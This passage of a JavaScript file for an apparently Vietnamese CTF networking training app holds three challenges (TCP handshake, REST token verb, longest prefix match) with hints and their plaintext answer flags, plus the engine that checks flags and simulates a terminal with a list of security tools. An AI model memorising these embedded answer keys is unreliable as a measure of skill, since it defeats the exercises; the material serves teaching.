                codeSnippet: `Quá trình bắt tay 3 bước TCP giữa Client và Server:
Bước 1: Client -> Server: [SYN] Seq = 1000
Bước 2: Server -> Client: [SYN, ACK] Seq = 5000, Ack = ???

---
YÊU CẦU:
Theo chuẩn RFC 793, cờ SYN tiêu thụ 1 đơn vị Sequence Number ảo.
Tính giá trị trường Acknowledgment Number (Ack) mà Server phải gửi trong gói SYN-ACK.
Cú pháp cờ: FLAG{ack_<giá_trị>}
(Ví dụ: FLAG{ack_5001})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>RFC 793</b>: Tiêu chuẩn kỹ thuật giao thức Transmission Control Protocol.<br>
            • <b>Wireshark</b>: Quan sát cờ SYN và các giá trị Sequence/Ack number.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Trong quá trình bắt tay 3 bước TCP, gói SYN không chứa dữ liệu nhưng vẫn tiêu thụ 1 đơn vị số thứ tự sequence number.<br>
            2. Giá trị Ack của phản hồi luôn bằng: <code>Seq của Client + 1</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{ack_1001}"
            },
            {
                id: 22,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 22: REST API Token Extraction (Tự Động Hóa Mạng)",
                category: "Lập Trình Mạng",
                difficulty: "Nâng cao",
                points: 250,
                description: "Bạn đang viết kịch bản Python tương tác với controller Cisco DNA Center để yêu cầu cấp mã xác thực Bearer Token. Phương thức HTTP Verb chuẩn nào được sử dụng khi gửi thông tin xác thực đăng nhập trong Request Body đến URI /dna/system/api/v1/auth/token?",
                codeSnippet: `import requests

url = "https://sandboxdnac.cisco.com/dna/system/api/v1/auth/token"
headers = {"Content-Type": "application/json"}

# Lập trình viên đang gọi API để xác thực và yêu cầu cấp mới Bearer Token:
response = requests.request("???", url, auth=("devnetuser", "Cisco123!"))

---
YÊU CẦU:
Trong chuẩn kiến trúc RESTful API, phương thức HTTP Verb nào (chữ thường: get, post, put, hay delete) được dùng khi gửi thông tin đăng nhập để yêu cầu tạo mới token phiên làm việc?
Cú pháp cờ: FLAG{http_<method>_token}
(Ví dụ: FLAG{http_get_token})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Postman / Insomnia</b>: Thử nghiệm RESTful API.<br>
            • <b>Cisco DevNet Documentation</b>: Hướng dẫn gọi API DNA Center.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. GET dùng để truy vấn đọc dữ liệu, không làm thay đổi trạng thái máy chủ.<br>
            2. Phương thức chuẩn nào gửi thông tin đăng nhập trong body và tạo phiên làm việc mới (tạo token mới)? Điền tên phương thức đó ở dạng chữ thường vào cờ.
        </div>
    </div>
</div>`,
                flag: "FLAG{http_post_token}"
            },
            {
                id: 23,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 23: Master Flag: Longest Prefix Match Triage (Giải Mã Định Tuyến)",
                category: "Định Tuyến Cốt Lõi",
                difficulty: "Chuyên gia",
                points: 300,
                description: "Router nhận được gói tin có địa chỉ IP đích là 10.10.20.150. Trong bảng định tuyến có 4 tuyến đường thỏa mãn: 10.0.0.0/8 (Next-Hop A), 10.10.0.0/16 (Next-Hop B), 10.10.20.0/24 (Next-Hop C) và 10.10.20.128/26 (Next-Hop D). Theo luật Longest Prefix Match của Cisco, gói tin sẽ được chuyển tiếp qua Next-Hop nào?",
                codeSnippet: `Bảng định tuyến của Router:
S    10.0.0.0/8       [1/0]   via Next-Hop A
O    10.10.0.0/16     [110/2] via Next-Hop B
O    10.10.20.0/24    [110/5] via Next-Hop C
S    10.10.20.128/26  [1/0]   via Next-Hop D

Gói tin IP có địa chỉ đích: 10.10.20.150

---
YÊU CẦU:
Theo nguyên lý Longest Prefix Match (LPM), Router sẽ chuyển tiếp gói tin qua Next-Hop nào (chữ cái A, B, C hoặc D) và độ dài prefix dài nhất tương ứng là bao nhiêu bit?
Cú pháp cờ: FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}
(Ví dụ: FLAG{next_hop_a_prefix_8})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Cisco IOS CLI</b>: <code>show ip route 10.10.20.150</code>.<br>
            • Nguyên lý Longest Prefix Match (LPM) trong CEF.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Địa chỉ 10.10.20.150 thuộc dải mạng của những prefix nào trong bảng?<br>
            2. Trong số các prefix khớp, prefix nào có số bit mạng lớn nhất (mặt nạ cụ thể nhất)?<br>
            3. Tìm chữ cái của Next-Hop tương ứng với prefix dài nhất đó.
        </div>
    </div>
</div>`,
                flag: "FLAG{next_hop_d_prefix_26}"
            }
        ];

        this.solvedFlags = new Set(JSON.parse(localStorage.getItem('mmt_ctf_solved') || '[]'));
        this.activeChallengeIndex = 0;
        this.currentDomainFilter = 'all';

        this.initDOM();
        this.bindEvents();
    }

    initDOM() {
        this.ui = {
            totalPointsText: document.getElementById('ctf-total-points'),
            solvedCountBadge: document.getElementById('ctf-solved-count'),
            challengeNav: document.getElementById('ctf-challenge-nav'),
            cardTitle: document.getElementById('ctf-card-title'),
            cardDomain: document.getElementById('ctf-card-domain'),
            cardCategory: document.getElementById('ctf-card-category'),
            cardDifficulty: document.getElementById('ctf-card-difficulty'),
            cardPoints: document.getElementById('ctf-card-points'),
            cardDesc: document.getElementById('ctf-card-desc'),
            codeSnippet: document.getElementById('ctf-card-code'),
            hintToggleBtn: document.getElementById('ctf-hint-toggle-btn'),
            hintBox: document.getElementById('ctf-hint-box'),
            hintText: document.getElementById('ctf-hint-text'),
            flagInput: document.getElementById('ctf-flag-input'),
            submitBtn: document.getElementById('ctf-submit-btn'),
            statusBox: document.getElementById('ctf-status-box'),
            terminalInput: document.getElementById('ctf-terminal-input'),
            terminalOutput: document.getElementById('ctf-terminal-output'),
            domainFilters: document.getElementById('ctf-domain-filters'),
            filterCountBadge: document.getElementById('ctf-filter-count-badge')
        };
    }

    bindEvents() {
        if (!this.ui.submitBtn) return;

        this.ui.submitBtn.addEventListener('click', () => {
            this.handleSubmitFlag();
        });

        this.ui.flagInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                this.handleSubmitFlag();
            }
        });

        if (this.ui.hintToggleBtn) {
            this.ui.hintToggleBtn.addEventListener('click', () => {
                this.ui.hintBox.classList.toggle('hidden');
                if (window.soundManager) window.soundManager.playClick();
            });
        }

        // Domain filter buttons
        if (this.ui.domainFilters) {
            this.ui.domainFilters.addEventListener('click', (e) => {
                const btn = e.target.closest('.ctf-filter-btn');
                if (!btn) return;
                const domain = btn.getAttribute('data-domain');
                this.filterByDomain(domain);
                if (window.soundManager) window.soundManager.playClick();
            });
        }

        // Terminal CLI simulation
        if (this.ui.terminalInput) {
            this.ui.terminalInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    const cmd = this.ui.terminalInput.value.trim();
                    this.ui.terminalInput.value = '';
                    this.handleTerminalCommand(cmd);
                }
            });
        }

        this.renderChallengeList();
        this.renderActiveChallenge();
        this.updateStats();
    }

    filterByDomain(domain) {
        this.currentDomainFilter = domain;

        // Update button states
        if (this.ui.domainFilters) {
            const btns = this.ui.domainFilters.querySelectorAll('.ctf-filter-btn');
            btns.forEach(b => {
                if (b.getAttribute('data-domain') === domain) {
                    b.classList.add('active');
                } else {
                    b.classList.remove('active');
                }
            });
        }

        // Check if current active challenge matches filter; if not, select first matching challenge
        const filtered = this.getFilteredChallenges();
        if (filtered.length > 0) {
            const current = this.challenges[this.activeChallengeIndex];
            if (this.currentDomainFilter !== 'all' && current && current.domain !== this.currentDomainFilter) {
                const firstMatchingIdx = this.challenges.findIndex(c => c.domain === this.currentDomainFilter);
                if (firstMatchingIdx !== -1) {
                    this.activeChallengeIndex = firstMatchingIdx;
                }
            }
        }

        this.renderChallengeList();
        this.renderActiveChallenge();
    }

    getFilteredChallenges() {
        if (this.currentDomainFilter === 'all') {
            return this.challenges;
        }
        return this.challenges.filter(c => c.domain === this.currentDomainFilter);
    }

    updateStats() {
        let total = 0;
        this.challenges.forEach(c => {
            if (this.solvedFlags.has(c.id)) {
                total += c.points;
            }
        });

        if (this.ui.totalPointsText) this.ui.totalPointsText.textContent = `${total} PTS`;
        if (this.ui.solvedCountBadge) this.ui.solvedCountBadge.textContent = `${this.solvedFlags.size} / ${this.challenges.length} Cờ Đã Giải`;
        if (this.ui.filterCountBadge) {
            const count = this.getFilteredChallenges().length;
            this.ui.filterCountBadge.textContent = `${count} bài`;
        }
    }

    renderChallengeList() {
        if (!this.ui.challengeNav) return;
        this.ui.challengeNav.innerHTML = '';

        const filtered = this.getFilteredChallenges();
        if (filtered.length === 0) {
            this.ui.challengeNav.innerHTML = '<div class="text-xs text-slate-500 p-4 text-center">Không có thử thách nào phù hợp.</div>';
            return;
        }

        filtered.forEach((c) => {
            const idx = this.challenges.findIndex(item => item.id === c.id);
            const btn = document.createElement('button');
            const isSolved = this.solvedFlags.has(c.id);
            const isActive = idx === this.activeChallengeIndex;

            btn.className = `ctf-nav-btn ${isActive ? 'active' : ''} ${isSolved ? 'solved' : ''}`;
            btn.innerHTML = `
                <div class="flex items-center justify-between">
                    <span class="font-bold text-xs truncate max-w-[210px]">${isSolved ? '✅' : '🚩'} Bài ${c.id}: ${c.category}</span>
                    <span class="text-xs text-cyan-400 font-mono font-bold shrink-0">+${c.points}p</span>
                </div>
                <div class="text-[11px] text-slate-400 truncate text-left mt-0.5">${c.title.split(':')[1] || c.title}</div>
                <div class="flex items-center gap-1.5 mt-1">
                    <span class="text-[10px] px-1.5 py-0.2 rounded bg-purple-950/80 text-purple-300 border border-purple-800/60">${c.domainVi.split('(')[0].trim()}</span>
                    <span class="text-[10px] px-1.5 py-0.2 rounded bg-slate-800 text-slate-300">${c.difficulty}</span>
                </div>
            `;

            btn.addEventListener('click', () => {
                this.activeChallengeIndex = idx;
                if (window.soundManager) window.soundManager.playClick();
                this.renderChallengeList();
                this.renderActiveChallenge();
            });

            this.ui.challengeNav.appendChild(btn);
        });

        this.updateStats();
    }

    renderActiveChallenge() {
        const c = this.challenges[this.activeChallengeIndex];
        if (!c) return;

        const isSolved = this.solvedFlags.has(c.id);

        if (this.ui.cardTitle) this.ui.cardTitle.textContent = c.title;
        if (this.ui.cardDomain) this.ui.cardDomain.textContent = c.domainVi;
        if (this.ui.cardCategory) this.ui.cardCategory.textContent = c.category;
        if (this.ui.cardDifficulty) this.ui.cardDifficulty.textContent = c.difficulty;
        if (this.ui.cardPoints) this.ui.cardPoints.textContent = `+${c.points} Điểm`;
        if (this.ui.cardDesc) this.ui.cardDesc.textContent = c.description;
        if (this.ui.codeSnippet) this.ui.codeSnippet.textContent = c.codeSnippet;
        if (this.ui.hintText) this.ui.hintText.innerHTML = c.hint;
        if (this.ui.hintBox) this.ui.hintBox.classList.add('hidden');

        if (this.ui.statusBox) this.ui.statusBox.classList.add('hidden');
        if (this.ui.flagInput) this.ui.flagInput.value = '';

        if (isSolved) {
            this.ui.flagInput.placeholder = "Bạn đã hoàn thành thử thách này!";
            this.ui.flagInput.disabled = true;
            this.ui.submitBtn.disabled = true;
            this.ui.submitBtn.innerHTML = "✅ ĐÃ CHIẾM CỜ";
            this.ui.submitBtn.className = "btn-secondary opacity-60";
        } else {
            this.ui.flagInput.placeholder = "Nhập cờ định dạng FLAG{...}";
            this.ui.flagInput.disabled = false;
            this.ui.submitBtn.disabled = false;
            this.ui.submitBtn.innerHTML = "🚩 Nộp Cờ (Submit Flag)";
            this.ui.submitBtn.className = "btn-primary";
        }
    }

    handleSubmitFlag() {
        const c = this.challenges[this.activeChallengeIndex];
        if (!c || this.solvedFlags.has(c.id)) return;

        const inputVal = this.ui.flagInput.value.trim();
        this.ui.statusBox.classList.remove('hidden');

        // Check flag case-insensitively
        const isCorrect = inputVal.toLowerCase() === c.flag.toLowerCase();

        if (isCorrect) {
            // Correct Flag
            if (window.soundManager) window.soundManager.playFlagCaptured();
            this.solvedFlags.add(c.id);
            localStorage.setItem('mmt_ctf_solved', JSON.stringify(Array.from(this.solvedFlags)));

            this.ui.statusBox.className = "p-3 rounded-xl bg-emerald-950/80 border border-emerald-500 text-emerald-300 font-bold text-center text-xs sm:text-sm";
            this.ui.statusBox.innerHTML = `🎉 CHÍNH XÁC! CỜ ĐÃ ĐƯỢC GIẢI MÃ THÀNH CÔNG! (+${c.points} Điểm)`;

            this.updateStats();
            this.renderChallengeList();
            this.renderActiveChallenge();

            // Append to terminal
            this.printTerminal(`[SUCCESS] Flag accepted for Challenge ${c.id}: ${c.title}! +${c.points} Points awarded!`, 'text-emerald-400 font-bold');
        } else {
            // Wrong Flag
            if (window.soundManager) window.soundManager.playWrong();
            this.ui.statusBox.className = "p-3 rounded-xl bg-rose-950/80 border border-rose-500 text-rose-300 font-bold text-center text-xs sm:text-sm";
            this.ui.statusBox.innerHTML = `❌ CỜ KHÔNG CHÍNH XÁC! Hãy kiểm tra lại phân tích dữ liệu hoặc mở "💡 Xem gợi ý giải mã cờ".`;

            this.printTerminal(`[FAIL] Invalid flag: "${inputVal}"`, 'text-rose-400');
        }
    }

    handleTerminalCommand(cmd) {
        if (!cmd) return;
        this.printTerminal(`guest@netlab:~$ ${cmd}`, 'text-cyan-300 font-bold');

        const parts = cmd.split(' ');
        const main = parts[0].toLowerCase();

        switch (main) {
            case 'help':
                this.printTerminal(
`[NETLAB CYBER TERMINAL CLI v3.0]
Các lệnh được hỗ trợ:
- list: Xem danh sách thử thách CTF theo bộ lọc
- cat: Đọc chi tiết thử thách hiện tại (Mô tả & Data Dump)
- hint: Xem gợi ý công cụ và giải pháp phân tích (không lộ đáp án)
- flag <FLAG{...}>: Nộp cờ nhanh qua Terminal
- tools: Cẩm nang công cụ an ninh mạng thực chiến (Wireshark, Nmap, Burp Suite, Hashcat, Volatility, Scapy, LinPEAS, Ghidra)
- b64 decode <chuỗi>: Giải mã Base64 nhanh trên console
- b64 encode <chuỗi>: Mã hóa Base64
- domain <all|1-8>: Lọc danh sách theo vùng hạ tầng (1: User, 2: Workstation, 3: LAN, 4: LAN-to-WAN, 5: WAN, 6: Remote, 7: System/Web, 8: CCNA)
- clear: Xóa màn hình terminal`, 'text-slate-200');
                break;

            case 'list':
                const filtered = this.getFilteredChallenges();
                this.printTerminal(`=== DANH SÁCH THỬ THÁCH (${filtered.length} BÀI) ===`, 'text-cyan-400 font-bold');
                filtered.forEach(c => {
                    const status = this.solvedFlags.has(c.id) ? '[✅ ĐÃ GIẢI]' : '[🚩 CHƯA GIẢI]';
                    const color = this.solvedFlags.has(c.id) ? 'text-emerald-400' : 'text-slate-300';
                    this.printTerminal(`${status} Bài ${c.id}: ${c.title} (+${c.points} pts)`, color);
                });
                break;

            case 'cat':
                const c = this.challenges[this.activeChallengeIndex];
                this.printTerminal(
`=== ${c.title} ===
[Vùng hạ tầng]: ${c.domainVi}
[Thể loại]: ${c.category} | [Độ khó]: ${c.difficulty} | [Điểm thưởng]: +${c.points}
------------------------------------------------------------
${c.description}

[Dữ liệu trích xuất]:
${c.codeSnippet}`, 'text-slate-200');
                break;

            case 'hint':
                const cur = this.challenges[this.activeChallengeIndex];
                // Strip HTML tags for clean terminal display
                const tempDiv = document.createElement('div');
                tempDiv.innerHTML = cur.hint;
                const cleanHint = tempDiv.innerText || tempDiv.textContent || "";
                this.printTerminal(`=== GỢI Ý BÀI ${cur.id} ===\n${cleanHint}`, 'text-amber-300');
                break;

            case 'tools':
                this.printTerminal(
`🛡️ BẢNG TRA CỨU CÔNG CỤ AN NINH MẠNG THỰC CHIẾN (CYBERSECURITY TOOLKIT):
----------------------------------------------------------------------
1. Wireshark / Tshark: Điều tra bắt gói tin mạng, phân tích giao thức (ARP, TCP, DNS, HTTP, SMB).
2. Nmap / NSE: Quét cổng, nhận diện phiên bản dịch vụ và quét lỗ hổng biên.
3. Burp Suite: Proxy kiểm thử thâm nhập ứng dụng Web (SQLi, XSS, CSRF, RCE, IDOR, JWT).
4. CyberChef: Con dao Thụy Sĩ giải mã Base64, Hex, URL, XOR, UTF-16LE, Hashing.
5. Hashcat / John the Ripper: Bẻ khóa mật khẩu và hash (MD5, SHA, NTLM, bcrypt).
6. Scapy: Thư viện Python chế tạo và phân mảnh gói tin IP/TCP bypass Firewall.
7. Volatility: Điều tra chứng cứ số trên bộ nhớ RAM (Memory Forensics), tìm malware ngầm.
8. LinPEAS / WinPEAS: Script tự động rà soát leo thang đặc quyền Linux/Windows.
9. Ghidra / IDA Pro / GDB: Dịch ngược nhị phân và khai thác tràn bộ đệm (Buffer Overflow).
10. Aircrack-ng suite: Bẻ khóa Wi-Fi WPA2, phát hiện Rogue AP / Evil Twin.`, 'text-cyan-300 font-mono');
                break;

            case 'b64':
                const action = parts[1] ? parts[1].toLowerCase() : '';
                const payload = parts.slice(2).join(' ');
                if (!action || !payload) {
                    this.printTerminal(`Cú pháp: b64 decode <chuỗi> HOẶC b64 encode <chuỗi>`, 'text-rose-400');
                    break;
                }
                try {
                    if (action === 'decode') {
                        // Standard base64 decode with UTF-16LE fallback check
                        const binaryStr = atob(payload.trim());
                        let decoded = "";
                        if (binaryStr.includes('\x00')) {
                            // Decode as UTF-16LE
                            const bytes = new Uint8Array(binaryStr.length);
                            for (let i = 0; i < binaryStr.length; i++) {
                                bytes[i] = binaryStr.charCodeAt(i);
                            }
                            decoded = new TextDecoder('utf-16le').decode(bytes);
                        } else {
                            decoded = decodeURIComponent(escape(binaryStr));
                        }
                        this.printTerminal(`[B64 DECODED]: ${decoded}`, 'text-emerald-300 font-bold');
                    } else if (action === 'encode') {
                        const encoded = btoa(unescape(encodeURIComponent(payload)));
                        this.printTerminal(`[B64 ENCODED]: ${encoded}`, 'text-emerald-300 font-bold');
                    } else {
                        this.printTerminal(`Lệnh b64 chỉ hỗ trợ 'decode' hoặc 'encode'`, 'text-rose-400');
                    }
                } catch (err) {
                    this.printTerminal(`[LỖI]: Không thể xử lý chuỗi Base64: ${err.message}`, 'text-rose-400');
                }
                break;

            case 'domain':
                const domArg = parts[1] ? parts[1].toLowerCase() : '';
                const domainMap = {
                    'all': 'all',
                    '1': 'user',
                    'user': 'user',
                    '2': 'workstation',
                    'workstation': 'workstation',
                    '3': 'lan',
                    'lan': 'lan',
                    '4': 'lan-to-wan',
                    'lan-to-wan': 'lan-to-wan',
                    '5': 'wan',
                    'wan': 'wan',
                    '6': 'remote-access',
                    'remote': 'remote-access',
                    '7': 'system-app',
                    'system': 'system-app',
                    'web': 'system-app',
                    '8': 'networking',
                    'ccna': 'networking'
                };
                if (domainMap[domArg]) {
                    this.filterByDomain(domainMap[domArg]);
                    this.printTerminal(`[DOMAIN]: Đã chuyển bộ lọc sang "${domainMap[domArg]}"!`, 'text-cyan-300');
                } else {
                    this.printTerminal(`Cú pháp: domain <all|1-8>. Ví dụ: domain 1 (Vùng Người Dùng), domain 7 (Hệ Thống & Web).`, 'text-amber-300');
                }
                break;

            case 'flag':
            case 'submit':
                const flagVal = parts.slice(1).join(' ').trim();
                if (flagVal) {
                    this.ui.flagInput.value = flagVal;
                    this.handleSubmitFlag();
                } else {
                    this.printTerminal(`Cú pháp: flag FLAG{...}`, 'text-rose-400');
                }
                break;

            case 'clear':
                if (this.ui.terminalOutput) this.ui.terminalOutput.innerHTML = '';
                break;

            default:
                this.printTerminal(`Lệnh không nhận dạng: "${cmd}". Gõ "help" hoặc "tools" để xem trợ giúp.`, 'text-slate-500');
                break;
        }
    }

    printTerminal(text, colorClass = 'text-slate-300') {
        if (!this.ui.terminalOutput) return;
        const line = document.createElement('div');
        line.className = `${colorClass} whitespace-pre-wrap leading-relaxed py-0.5`;
        line.textContent = text;
        this.ui.terminalOutput.appendChild(line);
        this.ui.terminalOutput.scrollTop = this.ui.terminalOutput.scrollHeight;
    }
}

window.ctfEngine = new CTFEngine();
